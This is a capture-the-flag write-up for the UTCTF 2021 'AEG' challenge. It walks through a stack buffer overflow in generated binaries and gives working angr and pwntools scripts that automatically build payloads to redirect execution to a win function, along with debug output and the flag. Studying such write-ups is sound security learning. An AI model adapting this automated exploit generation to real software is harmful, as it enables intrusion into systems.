# AEG

**Category**: Pwn \  
**Points**: 992 (30 solves) \  
**Author**: hukc

## Challenge

I got tired of writing problems and just made a script to do it.

Note: Your script may require several runs due to null-byte issues

`nc pwn.utctf.live 9997`

## Overview

Let's try connecting and see what happens:  
```  
$ nc pwn.utctf.live 9997  
You will be given 10 randomly generated binaries.  
You have 60 seconds to solve each one.  
Press enter when you're ready for the first binary.

00000000: 7f45 4c46 0201 0100 0000 0000 0000 0000  .ELF............  
00000010: 0200 3e00 0100 0000 6005 4000 0000 0000  ..>.....`.@.....  
00000020: 4000 0000 0000 0000 901c 0000 0000 0000  @...............  
...  
00002420: 0000 0000 0000 0000 c818 0000 0000 0000  ................  
00002430: b902 0000 0000 0000 0000 0000 0000 0000  ................  
00002440: 0100 0000 0000 0000 0000 0000 0000 0000  ................

You have 60 seconds to provide input:  
```

Cool, so basically we have to automatically generate an exploit.  
We can parse the hexdump into a binary using `xxd -r 0.hex > 0`

Opening it up in Ghidra, the program is pretty simple:  
```c  
void vuln(char *input) {  
 char buf[44];  
 encode1(input);  
 encode2(input);  
 encode3(input);  
 encode4(input);  
 encode5(input);  
 encode6(input);  
 encode7(input);  
 memcpy(buf, input, strlen(input));  
 return;  
}

int main() {  
 char buf [64];  
 fgets(buf, 64, stdin);  
 vuln(buf);  
 return 0;  
}

void win() {  
 exit(100);  
}  
```

There's a buffer overflow `vuln`: Our input is 64 bytes but it uses `memcpy`
to  
move our input into a 44 byte buffer.

Our goal is to call the `win` function and we should be able to overwrite the  
return address stored on the stack, but we have to deal with the `encode`  
functions that modify our input.

```c  
void encode1(char *s) {  
 for (int i = 0; i < 64; ++i) {  
   s[i] = s[i] ^ 0x85;  
 }  
}

void encode2(char *s) {  
 char local_58;  
 char local_50;  
 char local_48;  
 char local_40;  
 char local_38;  
 char local_30;  
 char local_28;  
 char local_20;  
 int j;  
 int i;

 i = 0;  
 while (i < 0x10) {  
   j = 0;  
   while (j < 4) {  
     (&local_58)[i * 4 + j] = s[j + *(int *)(grouping1 + (long)i * 4) * 4];  
     j = j + 1;  
   }  
   i = i + 1;  
 }  
 *(undefined8 *)s = _local_58;  
 *(undefined8 *)(s + 8) = _local_50;  
 *(undefined8 *)(s + 0x10) = _local_48;  
 *(undefined8 *)(s + 0x18) = _local_40;  
 *(undefined8 *)(s + 0x20) = _local_38;  
 *(undefined8 *)(s + 0x28) = _local_30;  
 *(undefined8 *)(s + 0x30) = _local_28;  
 *(undefined8 *)(s + 0x38) = _local_20;  
 return;  
}

...  
```

It would be a pain to write a custom script to reverse each of these `encode`  
functions, so let's use [angr](http://angr.io/) instead.

## Solution

This was my first time using angr, so I started by skimming the docs. I also  
found a few examples of similar automatic exploit generation challenges (with  
solvers!) [here](https://docs.angr.io/examples#exploitation).

After getting a basic understanding of angr, I tried running it in angr to see  
what would happen.

```  
$ python3 -m venv env  
$ source env/bin/activate  
$ pip install angr  
```

```python  
$ python3  
Python 3.8.5 (default, Jan 27 2021, 15:41:15)  
[GCC 9.3.0] on linux  
Type "help", "copyright", "credits" or "license" for more information.  
>>> import angr  
>>> filename = "sample/0"  
>>> proj = angr.Project(filename, auto_load_libs=False)  
>>> state = proj.factory.entry_state(stdin=angr.SimFile)  
>>> sm = proj.factory.simulation_manager(state)  
>>> sm.run()  
WARNING | 2021-03-15 14:12:11,909 | angr.storage.memory_mixins.default_filler_mixin | The program is accessing memory or registers with an unspecified value. This could indicate unwanted behavior.  
WARNING | 2021-03-15 14:12:11,909 | angr.storage.memory_mixins.default_filler_mixin | angr will cope with this by generating an unconstrained symbolic variable and continuing. You can resolve this by:  
WARNING | 2021-03-15 14:12:11,909 | angr.storage.memory_mixins.default_filler_mixin | 1) setting a value to the initial state  
WARNING | 2021-03-15 14:12:11,909 | angr.storage.memory_mixins.default_filler_mixin | 2) adding the state option ZERO_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to make unknown regions hold null  
WARNING | 2021-03-15 14:12:11,909 | angr.storage.memory_mixins.default_filler_mixin | 3) adding the state option SYMBOL_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to suppress these messages.  
WARNING | 2021-03-15 14:12:11,909 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff70 with 8 unconstrained bytes referenced from 0x700008 (strlen+0x0 in extern-address space (0x8))  
WARNING | 2021-03-15 14:12:17,164 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffefee0 with 44 unconstrained bytes referenced from 0x700020 (memcpy+0x0 in extern-address space (0x20))  
WARNING | 2021-03-15 14:12:20,590 | angr.engines.successors | Exit state has over 256 possible solutions. Likely unconstrained; skipping. <BV64 0x0 .. Reverse((if (strlen_4_64[31:31] .. strlen_4_64[31:31] .. strlen_4_64[31:31] .. strlen_4_64[31:31] .. strlen_4_64[31:31] .. strlen_4_64[31:31] .. strlen_4_64[31:31] .. strlen_4_64[31:31] .. strlen_4_64[31:31] .. strlen_4_64[31:31] .. strlen_4_64[31:31] .. strlen_4_64[31:31] .. strlen_4_64[31:31] .. strlen_4_64[31:31] .. strlen_4_64[31:31] .. strlen_4_64[31:31] .. strlen_4_64[31:31] .. strlen_4_64[31:31] .. strlen_4_64[31:31] .. strlen_4_64[31:31] .. strlen_4_64[31:31] .. strlen_4_64[31:31] .. strlen_4_64[31:31] .. strlen_4_64[31:31] .. strlen_4_64[31:31] .. strlen_4_64[31:31] .. strlen_4_64[31:31] .. strlen_4_64[31:31] .. strlen_4_64[31:31] .. strlen_4_64[31:31] .. strlen_4_64[31:31] .. strlen_4_64[31:31] .. strlen_4_64[31:0]) == 0x3b then (248 + (<...>[423:422] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[415:414] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[23:22] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[303:302] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[295:294] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[287:286] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[55:54] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[207:206] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[199:198] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[191:190] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[311:310] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[495:494] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[487:486] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[479:478] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[439:438] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[271:270] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[263:262] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[255:254] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[119:118] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[399:398] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[391:390] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[383:382] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[471:470] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[239:238] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[231:230] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[223:222] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[151:150] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[47:46] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[39:38] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[31:30] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[279:278] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[143:142] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[135:134] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[127:126] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[183:182] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[79:78] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[71:70] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[63:62] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[247:246] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[335:334] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[327:326] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[319:318] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[87:86] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[175:174] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[167:166] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[159:158] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[375:374] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[463:462] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[455:454] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[447:446] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[215:214] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[111:110] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[103:102] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[95:94] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[343:342] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[15:14] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 248 + (<...>[7:6] .. ~<...> .. ~<...> .. ~<...> .. ~<...>) .. 55 .. 248 + (<...>[407:406] .. ~<...> .. ~<...> .. ~<...> .. ~<...>)) else ((if <...> == <...> then (<...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...> .. <...>) else (<...> .. <...>))[471:8] .. 64))[23:0])>  
<SimulationManager with 1 unconstrained>  
```

Woah, looks like we got some results: The program terminated with 1  
unconstrained state.  
An unconstrained state occurs when we take control of the instruction  
pointer, hence the "unconstrained" state of execution (we can go to  
wherever we want).

Let's inspect the program counter (i.e. instruction pointer):

```python  
>>> exploitable_state = sm.unconstrained[0]  
>>> exploitable_state.regs.pc  
<BV64 0x0 .. (if strlen_4_64[31:0] == 0x3b && strlen_4_64[31:31] == 0 then 248
+ (file_0_stdin_0_2_504{UNINITIALIZED}[407:406] ..
~file_0_stdin_0_2_504{UNINITIALIZED}[405:403] ..
~file_0_stdin_0_2_504{UNINITIALIZED}[402:402] ..
~file_0_stdin_0_2_504{UNINITIALIZED}[401:401] ..
~file_0_stdin_0_2_504{UNINITIALIZED}[400:400]) else 64) .. (if
strlen_4_64[31:0] == 0x3b && strlen_4_64[31:31] == 0 || strlen_4_64[31:0] ==
0x3a && strlen_4_64[31:31] == 0 then 55 else 10) .. (if strlen_4_64[31:0] ==
0x3b && strlen_4_64[31:31] == 0 || strlen_4_64[31:0] == 0x3a &&
strlen_4_64[31:31] == 0 || strlen_4_64[31:0] == 0x39 && strlen_4_64[31:31] ==
0 then 248 + (file_0_stdin_0_2_504{UNINITIALIZED}[7:6] ..
~file_0_stdin_0_2_504{UNINITIALIZED}[5:3] ..
~file_0_stdin_0_2_504{UNINITIALIZED}[2:2] ..
~file_0_stdin_0_2_504{UNINITIALIZED}[1:1] ..
~file_0_stdin_0_2_504{UNINITIALIZED}[0:0]) else 79)>  
```

Cool! We can actually see a bunch of symbolic transformations that were
applied  
to our input! That means all we need to do is use angr's solver engine to
determine which input will set `exploitable_state.regs.pc` to the address of
`win`.

Here's my script:  
```python  
import angr  
import claripy  
import sys

def main(filename):  
   proj = angr.Project(filename, auto_load_libs=False)

   # There's an fgets in main that reads 64 bytes from stdin.  
   payload = [claripy.BVS(f"byte_{i}", 8) for i in range(64)]  
   payload_ast = claripy.Concat(*payload + [claripy.BVV(b'\n')])

   st = proj.factory.full_init_state(  
       args=[filename],  
       add_options=angr.options.unicorn,  
       stdin=payload_ast  
   )

   # There aren't really any branches in the program, so let's just run it  
   # until it terminates or reaches an unconstrained state.  
   # ---  
   # An unconstrained state occurs when we take control of the instruction  
   # pointer, hence the "unconstrained" state of execution (we can go to  
   # wherever we want).  
   sm = proj.factory.simulation_manager(st, save_unconstrained=True)  
   sm.run()

   # Take the first exploitable state that controls instruction pointer (for  
   # this problem there's only one).  
   ep = sm.unconstrained[0]  
   pc = ep.regs.pc

   # Use the constraints solver to find a payload that sets $rip to the win  
   # address, then save the payload to a file.  
   win = proj.loader.find_symbol("win")  
   ep.add_constraints(ep.regs.pc == win.linked_addr)  
   payload_real = ep.solver.eval(payload_ast, cast_to=bytes)  
   open(f"{filename}.exp", "wb").write(payload_real)  
   print(f"[+] Wrote payload to {filename}.exp")

if __name__ == '__main__':  
   main(sys.argv[1])  
```

Now let's test it:  
```  
$ python3 aeg.py sample/0  
...  
[+] Wrote payload to sample/0.exp

$ ./sample/0 < sample/0.exp

$ echo $?  
100  
```

That means the program exited with status code `100`, which means that the  
`win` function was called! Now all that's left is to wrap this in a pwntools  
script to interact with the challenge server:

> Note: For some reason I couldn't get pwntools and angr to work in the same  
> Python virtualenv, so I had to do an ugly workaround.

```python  
import pwn  
import subprocess

def aeg(i: int):  
   """  
   Run aeg.py in virtualenv with angr installed, since pwntools and angr seem  
   to have dependency conflicts >:(  
   """  
   filename = f"bins/{i}"  
   cmd = f"./env/bin/python aeg.py {filename}"  
   print(subprocess.check_output(cmd, shell=True))  
   return open(f"bins/{i}.exp", "rb").read()

pwn.context.log_level = "debug"  
io = pwn.remote("pwn.utctf.live", 9997)  
io.sendlineafter("Press enter when you're ready for the first binary.", "")

for i in range(10):  
   s = io.recvuntilS("You have 60 seconds to provide input:")  
   s = "\n".join(s.split("\n")[:-1])  # Get rid of the last line  
   s = s.strip()  
   open(f"bins/{i}.hex", "w").write(s)  
   # Parse hexdump into a binary file  
   subprocess.check_output(f"xxd -r bins/{i}.hex > bins/{i}", shell=True)

   exp = aeg(i)  
   io.sendline(exp)  
   io.recvuntil("Process exited with return code")  
   io.recvline()

io.interactive()  
```

The first time I ran it failed on the 6th case due to  
`claripy.errors.UnsatError: CompositeSolver is already unsat`, so I just ran
it  
again it gave me the flag!

```  
$ python3 solve.py  
...  
b'[+] Wrote payload to bins/9.exp\n'  
[DEBUG] Sent 0x42 bytes:  
   00000000  40 10 04 80  34 88 02 40  04 04 40 01  10 02 08 02
│@···│4··@│··@·│····│  
   00000010  20 20 08 10  40 80 40 01  01 20 c2 10  10 02 40 20  │  ··│@·@·│·
··│··@ │  
   00000020  40 01 80 02  20 80 02 80  40 80 08 04  01 80 08 20  │@···│
···│@···│··· │  
   00000030  08 10 01 20  08 02 02 08  20 40 04 00  00 f5 00 00  │··· │····│
@··│····│  
   00000040  0a 0a                                               │··│  
   00000042  
[DEBUG] Received 0x2e bytes:  
   b'Process exited with return code 100\n'  
   b'Congrats!\n'  
[*] Switching to interactive mode  
Congrats!  
[DEBUG] Received 0x27 bytes:  
   b'utflag{exploit_machine_goes_brrrrrrrr}\n'  
utflag{exploit_machine_goes_brrrrrrrr}  
[*] Got EOF while reading in interactive  
$  
```

What a cool challenge :)  

Original writeup (https://github.com/cscosu/ctf-
writeups/tree/master/2021/utctf/AEG).